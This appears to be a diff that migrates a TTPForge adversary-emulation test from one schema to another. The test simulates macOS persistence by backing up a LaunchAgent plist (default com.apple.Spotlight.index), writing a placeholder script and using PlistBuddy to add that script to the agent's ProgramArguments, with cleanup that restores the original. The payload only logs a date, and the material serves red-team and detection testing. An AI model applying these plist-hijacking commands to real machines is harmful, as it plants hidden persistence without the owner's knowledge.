@@ -1,61 +1,55 @@
+---
 api_version: 2.0
-uuid: 12345678-3333-3333-3333-333333333333
+uuid: 17b5fe38-5cba-4a1e-88fc-c8e8a2652649
 name: Modify existing LaunchAgent
-description: Modifies an existing LaunchAgent plist to inject persistent code
-mitre_attack_id: T1547.011
-mitre_attack_technique: Boot or Logon Initialization Scripts - Plist Modification
-mitre_attack_tactic: Persistence
-platforms:
-  - darwin
+authors:
+- TTPForge
+description: |
+  Modifies an existing LaunchAgent plist to inject persistent code
+mitre:
+  tactics:
+  - TA0003 Persistence
+  techniques:
+  - T1543 Create or Modify System Process
+  subtechniques:
+  - 'T1543.001 Create or Modify System Process: Launch Agent'
 requirements:
   platforms:
-    - os: darwin
+  - os: darwin
 args:
-  target_agent:
-    description: Name of existing LaunchAgent to modify
-    type: string
-    default: com.apple.Spotlight.index
-  malicious_script:
-    description: Path to malicious script to inject
-    type: string
-    default: /tmp/injected_payload.sh
-  backup_path:
-    description: Path to backup the original plist
-    type: string
-    default: /tmp/original_plist_backup.plist
+- name: target_agent
+  description: Name of existing LaunchAgent to modify
+  type: string
+  default: com.apple.Spotlight.index
+- name: malicious_script
+  description: Path to malicious script to inject
+  type: string
+  default: /tmp/injected_payload.sh
+- name: backup_path
+  description: Path to backup the original plist
+  type: string
+  default: /tmp/original_plist_backup.plist
 steps:
-  - name: backup_original_plist
-    type: shell_command
-    command: "cp ~/Library/LaunchAgents/{{ target_agent }}.plist {{ backup_path }}"
-  
-  - name: create_injected_script
-    type: create_file
-    path: "{{ malicious_script }}"
-    contents: |
-      #!/bin/bash
-      # Injected payload
-      echo "Modified LaunchAgent executed at $(date)" >> /tmp/modified.log
-      # Perform malicious actions
-    permissions: "0755"
-  
-  - name: inject_into_plist
-    type: shell_command
-    command: |
-      /usr/libexec/PlistBuddy -c "Add :ProgramArguments:0 string {{ malicious_script }}" ~/Library/LaunchAgents/{{ target_agent }}.plist
-
-checks:
-  - type: file_contains
-    path: "~/Library/LaunchAgents/{{ target_agent }}.plist"
-    value: "{{ malicious_script }}"
-  - type: file_exists
-    path: "{{ backup_path }}"
-
-cleanup:
-  - type: shell_command
-    command: "cp {{ backup_path }} ~/Library/LaunchAgents/{{ target_agent }}.plist"
-  - type: remove_file
-    path: "{{ backup_path }}"
-  - type: remove_file
-    path: "{{ malicious_script }}"
-  - type: remove_file
-    path: "/tmp/modified.log"
+- name: backup_original_plist
+  inline: cp ~/Library/LaunchAgents/{{ .Args.target_agent }}.plist {{ .Args.backup_path }}
+- name: create_injected_script
+  create_file: '{{ .Args.malicious_script }}'
+  contents: |
+    #!/bin/bash
+    # Injected payload
+    echo "Modified LaunchAgent executed at $(date)" >> /tmp/modified.log
+    # Perform malicious actions
+  mode: 493
+  cleanup: default
+- name: inject_into_plist
+  inline: |
+    /usr/libexec/PlistBuddy -c "Add :ProgramArguments:0 string {{ .Args.malicious_script }}" ~/Library/LaunchAgents/{{ .Args.target_agent }}.plist
+  cleanup:
+    inline: |-
+      cp {{ .Args.backup_path }} ~/Library/LaunchAgents/{{ .Args.target_agent }}.plist
+      rm -f "{{ .Args.backup_path }}"
+      rm -f "{{ .Args.malicious_script }}"
+      rm -f "/tmp/modified.log"
+tests:
+- name: dry_run_test
+  dry_run: true
